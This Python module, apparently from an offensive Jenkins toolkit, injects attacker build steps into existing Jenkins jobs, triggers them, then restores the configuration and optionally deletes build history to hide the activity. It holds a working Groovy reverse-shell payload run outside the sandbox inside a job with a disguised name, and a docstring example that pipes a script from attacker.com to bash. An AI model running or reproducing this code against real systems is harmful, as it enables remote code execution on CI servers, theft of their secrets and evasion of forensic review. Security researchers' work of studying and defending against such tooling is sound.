"""
FEATURE: Jenkins Job Configuration Injection with Automatic Rollback

This module provides stealthy job configuration manipulation with automatic rollback
capabilities for maintaining operational security during post-exploitation activities.

Techniques:
    1. Inject malicious build steps into existing jobs
    2. Execute payload via triggered build
    3. Automatically restore original configuration
    4. Leave minimal forensic footprint
"""

import time
import xml.etree.ElementTree as ET
from typing import Any, Optional

from jenkins_breaker.modules.base import ExploitMetadata, ExploitModule, ExploitResult


class FeatureJobConfig(ExploitModule):
    """
    Stealthy job configuration injection with automatic rollback.

    Attack Flow:
        1. Enumerate accessible jobs
        2. Backup original job configuration
        3. Inject malicious build step (execute shell, Groovy script, etc.)
        4. Trigger job execution
        5. Monitor build completion
        6. Restore original configuration
        7. Clean up build history (optional)

    Example:
        module = FeatureJobConfig()
        result = module.run(
            session,
            job_name='test-job',
            command='curl http://attacker.com/shell.sh | bash',
            rollback=True,
            cleanup_history=False
        )
    """

    CVE_ID = "FEATURE-JOB-CONFIG"

    METADATA = ExploitMetadata(
        cve_id="FEATURE-JOB-CONFIG",
        name="Jenkins Job Configuration Injection",
        description="Stealthy job configuration manipulation with automatic rollback for minimal forensic footprint",
        affected_versions=["All versions"],
        mitre_attack=["T1059.006", "T1059.004", "T1543.003", "T1070.004"],
        severity="high",
        references=[
            "https://www.jenkins.io/doc/book/managing/cli/",
            "https://attack.mitre.org/techniques/T1543/003/"
        ],
        requires_auth=True,
        requires_crumb=True,
        tags=["rce", "stealth", "job-manipulation", "rollback", "post-exploitation"],
        author="ridpath"
    )

    def check_vulnerable(self, session: Any, **kwargs: Any) -> bool:
        """
        Check if job creation/modification is accessible.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments

        Returns:
            bool: True if can access jobs, False otherwise
        """
        try:
            response = session.get("/api/json?tree=jobs[name]")
            return response.status_code == 200
        except Exception:
            return False

    def run(self, session: Any, **kwargs: Any) -> ExploitResult:
        """
        Inject malicious configuration into job with optional rollback.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
                - job_name (str): Target job name (or 'auto' to select first available)
                - command (str): Command to execute (default: 'id')
                - build_step_type (str): 'shell', 'groovy', 'batch' (default: 'shell')
                - rollback (bool): Restore original config after execution (default: True)
                - cleanup_history (bool): Delete malicious build from history (default: False)
                - wait_for_completion (bool): Wait for build to complete (default: True)
                - timeout (int): Build completion timeout in seconds (default: 60)

        Returns:
            ExploitResult: Result of the injection
        """
        job_name = kwargs.get('job_name', 'auto')
        command = kwargs.get('command', 'id')
        build_step_type = kwargs.get('build_step_type', 'shell')
        rollback = kwargs.get('rollback', True)
        cleanup_history = kwargs.get('cleanup_history', False)
        wait_for_completion = kwargs.get('wait_for_completion', True)
        timeout = kwargs.get('timeout', 60)

        try:
            if not self.check_vulnerable(session):
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details="Job API not accessible - insufficient permissions"
                )

            if job_name == 'auto':
                # If reverse shell mode (lhost provided), always create new temp job with baked-in payload
                if kwargs.get('lhost'):
                    job_name = self._create_temp_job(session, lhost=kwargs.get('lhost'), lport=kwargs.get('lport'))
                    if not job_name:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="failure",
                            details="Failed to create temporary job with reverse shell payload"
                        )
                    # Skip modification - reverse shell is already baked into job, just trigger it
                    build_success = self._trigger_build_async(session, job_name)
                    if not build_success:
                        return ExploitResult(
                            exploit=self.CVE_ID,
                            status="failure",
                            details=f"Failed to trigger build for job: {job_name}"
                        )

                    return ExploitResult(
                        exploit=self.CVE_ID,
                        status="success",
                        details=f"Reverse shell job triggered: {job_name}",
                        data={
                            "job_name": job_name,
                            "payload": f"{kwargs.get('lhost')}:{kwargs.get('lport')}"
                        }
                    )
                else:
                    # Command execution mode - find or create job, then modify and trigger
                    job_name = self._find_suitable_job(session)
                    if not job_name:
                        job_name = self._create_temp_job(session, lhost=None, lport=None)
                        if not job_name:
                            return ExploitResult(
                                exploit=self.CVE_ID,
                                status="failure",
                                details="No suitable jobs found and failed to create temporary job"
                            )

            original_config = self._get_job_config(session, job_name)
            if not original_config:
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to retrieve configuration for job: {job_name}"
                )

            modified_config = self._inject_build_step(
                original_config,
                command,
                build_step_type
            )

            if not self._update_job_config(session, job_name, modified_config):
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to update job configuration: {job_name}"
                )

            build_number = self._trigger_build(session, job_name)
            if not build_number:
                if rollback:
                    self._update_job_config(session, job_name, original_config)
                return ExploitResult(
                    exploit=self.CVE_ID,
                    status="failure",
                    details=f"Failed to trigger build for job: {job_name}"
                )

            build_output = None
            if wait_for_completion:
                build_output = self._wait_for_build(session, job_name, build_number, timeout)

            if rollback:
                time.sleep(2)
                if self._update_job_config(session, job_name, original_config):
                    rollback_status = "successful"
                else:
                    rollback_status = "failed"
            else:
                rollback_status = "skipped"

            cleanup_status = "skipped"
            if cleanup_history and build_number:
                if self._delete_build(session, job_name, build_number):
                    cleanup_status = "successful"
                else:
                    cleanup_status = "failed"

            return ExploitResult(
                exploit=self.CVE_ID,
                status="success",
                details=f"Job configuration injection successful: {job_name}",
                data={
                    "job_name": job_name,
                    "command": command,
                    "build_number": build_number,
                    "build_output": build_output[:500] if build_output else None,
                    "rollback_status": rollback_status,
                    "cleanup_status": cleanup_status,
                    "attack_steps": [
                        "1. Backed up original job configuration",
                        "2. Injected malicious build step",
                        "3. Triggered job execution",
                        f"4. Rollback: {rollback_status}",
                        f"5. Cleanup: {cleanup_status}"
                    ]
                }
            )

        except Exception as e:
            return ExploitResult(
                exploit=self.CVE_ID,
                status="error",
                details=f"Injection failed: {str(e)}",
                error=str(e)
            )

    def _find_suitable_job(self, session: Any) -> Optional[str]:
        """
        Find a suitable job for injection.

        Args:
            session: JenkinsSession instance

        Returns:
            Job name or None
        """
        try:
            response = session.get("/api/json?tree=jobs[name,buildable]")
            if response.status_code != 200:
                return None

            data = response.json()
            jobs = data.get('jobs', [])

            for job in jobs:
                if job.get('buildable', False):
                    return job.get('name')

            if jobs:
                return jobs[0].get('name')

            return None
        except Exception:
            return None

    def _create_temp_job(self, session: Any, lhost: str = None, lport: int = 4444) -> Optional[str]:
        """
        Create a temporary freestyle job for exploitation.

        Args:
            session: JenkinsSession instance
            lhost: Listener host for reverse shell
            lport: Listener port

        Returns:
            Job name or None
        """
        try:
            import random
            import string
            import time

            from jenkins_breaker.core.authentication import CrumbManager

            timestamp = int(time.time() * 1000) % 1000000
            benign_names = [
                f"integration-test-{timestamp}",
                f"build-worker-{timestamp}",
                f"ci-pipeline-check-{timestamp}",
                f"deploy-validation-{timestamp}",
                f"health-monitor-{timestamp}"
            ]
            job_name = random.choice(benign_names)

            if lhost:
                # Create job with reverse shell payload with explicit imports for SystemGroovy
                # Keep main thread alive so Jenkins doesn't kill background shell thread
                shell_command = f"""<![CDATA[import java.net.Socket
import java.io.*

Thread.start{{
String host="{lhost}";
int port={lport};
Process p=new ProcessBuilder("/bin/sh","-i").redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){{try{{while(pi.available()>0)so.write(pi.read());while(si.available()>0){{int c=si.read();if(c==13)c=10;po.write(c);}}so.flush();po.flush();Thread.sleep(50);try{{p.exitValue();break;}}catch(Exception e){{}}}}catch(Exception e){{}}}}p.destroy();s.close();
}}

// Keep build alive so Jenkins doesn't kill background thread
Thread.sleep(600000)
]]>"""
            else:
                shell_command = "echo 'Temporary job created for testing'"

            job_xml = f'''<?xml version='1.1' encoding='UTF-8'?>
<project>
  <description>Temporary job for exploitation</description>
  <keepDependencies>false</keepDependencies>
  <properties/>
  <scm class="hudson.scm.NullSCM"/>
  <canRoam>true</canRoam>
  <disabled>false</disabled>
  <blockBuildWhenDownstreamBuilding>false</blockBuildWhenDownstreamBuilding>
  <blockBuildWhenUpstreamBuilding>false</blockBuildWhenUpstreamBuilding>
  <triggers/>
  <concurrentBuild>false</concurrentBuild>
  <builders>
    <hudson.plugins.groovy.SystemGroovy plugin="groovy@2.0">
      <source class="hudson.plugins.groovy.StringSystemScriptSource">
        <script plugin="script-security@1.75">
          <script>{shell_command}</script>
          <sandbox>false</sandbox>
        </script>
      </source>
      <classpath></classpath>
    </hudson.plugins.groovy.SystemGroovy>
  </builders>
  <publishers/>
  <buildWrappers/>
</project>'''

            crumb_manager = CrumbManager(
                base_url=session.base_url,
                auth=session.auth,
                verify_ssl=False
            )
            crumb_manager.fetch()

            headers = {'Content-Type': 'application/xml'}
            headers.update(crumb_manager.get_header())

            response = session.post(
                f"/createItem?name={job_name}",
                data=job_xml,
                headers=headers
            )

            if response.status_code in [200, 201]:
                return job_name

            return None
        except Exception:
            return None

    def _get_job_config(self, session: Any, job_name: str) -> Optional[str]:
        """
        Retrieve job configuration XML.

        Args:
            session: JenkinsSession instance
            job_name: Job name

        Returns:
            Configuration XML or None
        """
        try:
            response = session.get(f"/job/{job_name}/config.xml")
            if response.status_code == 200:
                return response.text
            return None
        except Exception:
            return None

    def _inject_build_step(
        self,
        config_xml: str,
        command: str,
        step_type: str
    ) -> str:
        """
        Inject malicious build step into job configuration.

        Args:
            config_xml: Original configuration XML
            command: Command to execute
            step_type: Build step type

        Returns:
            Modified configuration XML
        """
        try:
            root = ET.fromstring(config_xml)

            builders = root.find('.//builders')
            if builders is None:
                builders = ET.SubElement(root, 'builders')

            if step_type == 'shell':
                shell_step = ET.SubElement(builders, 'hudson.tasks.Shell')
                command_elem = ET.SubElement(shell_step, 'command')
                command_elem.text = command

            elif step_type == 'groovy':
                groovy_step = ET.SubElement(
                    builders,
                    'hudson.plugins.groovy.SystemGroovy'
                )
                source = ET.SubElement(groovy_step, 'source')
                source.set('class', 'hudson.plugins.groovy.StringSystemScriptSource')
                script = ET.SubElement(source, 'script')
                script.set('plugin', 'groovy@2.0')
                script_elem = ET.SubElement(script, 'script')
                script_elem.text = f'println "{command}".execute().text'

            elif step_type == 'batch':
                batch_step = ET.SubElement(builders, 'hudson.tasks.BatchFile')
                command_elem = ET.SubElement(batch_step, 'command')
                command_elem.text = command

            return ET.tostring(root, encoding='utf-8').decode('utf-8')

        except Exception:
            return config_xml

    def _update_job_config(
        self,
        session: Any,
        job_name: str,
        config_xml: str
    ) -> bool:
        """
        Update job configuration.

        Args:
            session: JenkinsSession instance
            job_name: Job name
            config_xml: New configuration XML

        Returns:
            True if successful, False otherwise
        """
        try:
            response = session.post(
                f"/job/{job_name}/config.xml",
                headers={"Content-Type": "application/xml"},
                data=config_xml
            )
            return response.status_code in [200, 302]
        except Exception:
            return False

    def _trigger_build(self, session: Any, job_name: str) -> Optional[int]:
        """
        Trigger job build.

        Args:
            session: JenkinsSession instance
            job_name: Job name

        Returns:
            Build number or None
        """
        try:
            response = session.post(f"/job/{job_name}/build")

            if response.status_code in [200, 201, 302]:
                time.sleep(2)

                job_info = session.get(f"/job/{job_name}/api/json").json()
                last_build = job_info.get('lastBuild')
                if last_build:
                    return last_build.get('number')

            return None
        except Exception:
            return None

    def _trigger_build_async(self, session: Any, job_name: str) -> bool:
        """
        Trigger job build without waiting for build number (async mode for reverse shells).

        Args:
            session: JenkinsSession instance
            job_name: Job name

        Returns:
            True if trigger was successful, False otherwise
        """
        try:
            from jenkins_breaker.core.authentication import CrumbManager
            crumb_manager = CrumbManager(
                base_url=session.base_url,
                auth=session.auth,
                verify_ssl=False
            )
            crumb_manager.fetch()

            headers = crumb_manager.get_header()
            response = session.post(f"/job/{job_name}/build", headers=headers)

            # Jenkins returns 201 (Created) or 302 (redirect to queue) on success
            return response.status_code in [200, 201, 302]
        except Exception:
            return False

    def _wait_for_build(
        self,
        session: Any,
        job_name: str,
        build_number: int,
        timeout: int
    ) -> Optional[str]:
        """
        Wait for build completion and retrieve output.

        Args:
            session: JenkinsSession instance
            job_name: Job name
            build_number: Build number
            timeout: Timeout in seconds

        Returns:
            Build console output or None
        """
        start_time = time.time()

        while time.time() - start_time < timeout:
            try:
                response = session.get(
                    f"/job/{job_name}/{build_number}/api/json"
                )

                if response.status_code == 200:
                    build_data = response.json()

                    if not build_data.get('building', True):
                        console_response = session.get(
                            f"/job/{job_name}/{build_number}/consoleText"
                        )

                        if console_response.status_code == 200:
                            return console_response.text
                        break

                time.sleep(2)
            except Exception:
                break

        return None

    def _delete_build(
        self,
        session: Any,
        job_name: str,
        build_number: int
    ) -> bool:
        """
        Delete build from history.

        Args:
            session: JenkinsSession instance
            job_name: Job name
            build_number: Build number

        Returns:
            True if successful, False otherwise
        """
        try:
            response = session.post(
                f"/job/{job_name}/{build_number}/doDelete"
            )
            return response.status_code in [200, 302]
        except Exception:
            return False

    def cleanup(self, session: Any, **kwargs: Any) -> None:
        """
        Cleanup after execution.

        Args:
            session: JenkinsSession instance
            **kwargs: Additional arguments
        """
        pass
